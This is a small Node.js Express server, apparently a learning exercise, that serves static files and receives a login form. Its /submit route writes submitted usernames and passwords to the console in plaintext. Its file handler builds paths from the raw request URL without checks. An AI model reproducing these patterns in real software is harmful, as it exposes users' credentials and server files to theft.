// 安裝依賴：npm install express body-parser
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const port = 5001;
const ip = '127.0.0.1';

// 處理 POST 表單資料
app.use(bodyParser.urlencoded({ extended: true }));

// 處理 POST 路由
app.post('/submit', (req, res) => {
    const account = req.body.username;
    const passwd = req.body.password;

    console.log('帳號:', account);
    console.log('密碼:', passwd);

});

// 處理靜態檔案
app.get('*', (req, res) => {
    let url = req.url;
    let filePath = path.join(__dirname, 'html', url);

    // 預設首頁
    if (url === '/') {
        filePath = path.join(__dirname, 'html', 'index.html');
    }

    const extname = path.extname(filePath).toLowerCase();
    let contentType = 'text/plain';

    switch (extname) {
        case '.html':
            contentType = 'text/html';
            break;
        case '.css':
            contentType = 'text/css';
            break;
        case '.js':
            contentType = 'application/javascript';
            break;
        case '.png':
            contentType = 'image/png';
            break;
        case '.jpg':
        case '.jpeg':
            contentType = 'image/jpeg';
            break;
        case '.gif':
            contentType = 'image/gif';
            break;
    }

    fs.readFile(filePath, (error, data) => {
        if (error) {
            res.status(404).type('text/plain').send('找不到資源');
        } else {
            res.status(200).type(contentType).send(data);
        }
    });
});

app.listen(port, ip, () => {
    console.log(`Server is running at http://${ip}:${port}`);
});
